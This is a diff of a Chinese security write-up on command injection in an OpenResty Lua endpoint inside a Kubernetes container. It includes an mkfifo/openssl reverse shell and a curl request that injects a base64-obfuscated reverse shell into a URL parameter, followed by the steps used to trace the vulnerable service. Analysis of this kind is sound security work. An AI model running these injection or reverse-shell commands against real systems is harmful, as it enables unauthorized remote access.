@@ -65,7 +65,7 @@ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <IP>:
 1、请求目机机器上执行命令有三种方法：
 
 ```
-curl：curl "http://ip/package?path=`echo bWtmaWZvIC90bXAvczsvYmluL2Jhc2ggLWkgPCAvdG1wL3MgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMC42Mi45Ni4yMzY6ODg4ID4gL3RtcC9zO3JtIC1mIC90bXAvcw== | base64 -d | sh`"
+curl：curl "http://ip/package?path=`echo bWtmaWZvIC90bXAvczsvYmluL2Jhc2ggLWkgPCAvdG1wL3MgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMC42Mi45Ni4yMzY6ODg4ID4gL3RtcC9zO3JtIC1mIC90bXAvcw== | base64 -d | sh`"
 ```
 
 2、直接 web 上面请求：
@@ -93,18 +93,18 @@ netstat -anvp | grep :80
 返回结果如下：
 
 ```
-tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      16554/nginx: mas
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      16554/nginx: mas
 ```
 
-运行在 80 端口的程序为 nginx，在宿主机中寻找 nginx 程序
+运行在 80 端口的程序为 nginx，在宿主机中寻找 nginx 程序
 
 ```
 find / -name nginx
 ```
 
-发现宿主机中没有运行 nginx
+发现宿主机中没有运行 nginx
 
-于是尝试进入 k8s 中的容器寻找响应服务
+于是尝试进入 k8s 中的容器寻找响应服务
 
 ```
 docker ps | grep openresty
@@ -116,7 +116,7 @@ docker ps | grep openresty
 b61e91356e49    "/usr/local/openresty"
 ```
 
-最终在 k8s 中的 openresty 容器中发现了 nginx 程序 /usr/local/openresty/nginx，查询 nginx 配置文件，发现配置文件当中引用了一行 lua 脚本：
+最终在 k8s 中的 openresty 容器中发现了 nginx 程序 /usr/local/openresty/nginx，查询 nginx 配置文件，发现配置文件当中引用了一行 lua 脚本：
 
 ```
 location = /package {
@@ -125,10 +125,10 @@ location = /package {
                 proxy_set_header X-Nginx-IP $server_addr;
                 limit_req zone=normalfrequ burst=20 nodelay;
                 content_by_lua_file lua/package.lua;
-          }
+          }
 ```
 
-查询该文件并查看文件内容 cat /usr/local/openresty/nginx/lua/package.lua
+查询该文件并查看文件内容 cat /usr/local/openresty/nginx/lua/package.lua
 
 ```
 local package_absolute_path = '/var/log/logs.tar.gz'
